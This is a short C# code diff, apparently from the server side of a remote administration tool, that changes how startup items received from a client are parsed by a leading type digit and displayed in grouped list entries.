@@ -119,15 +119,20 @@ namespace xServer.Core.Commands
             if (client.Value.FrmStm == null || packet.StartupItems == null)
                 return;
 
-            foreach (var pair in packet.StartupItems)
+            foreach (var item in packet.StartupItems)
             {
                 if (client.Value.FrmStm == null) return;
 
-                var temp = pair.Key.Split(new string[] { "||" }, StringSplitOptions.None);
+                char tempChar = item[0];
+                int type;
+                if (!int.TryParse(tempChar.ToString(), out type)) continue;
+
+                string preparedItem = item.Remove(0, 1);
+                var temp = preparedItem.Split(new string[] { "||" }, StringSplitOptions.None);
                 var l = new ListViewItem(temp)
                 {
-                    Group = client.Value.FrmStm.GetGroup(pair.Value),
-                    Tag = pair.Value
+                    Group = client.Value.FrmStm.GetGroup(type),
+                    Tag = type
                 };
 
                 if (l.Group == null)
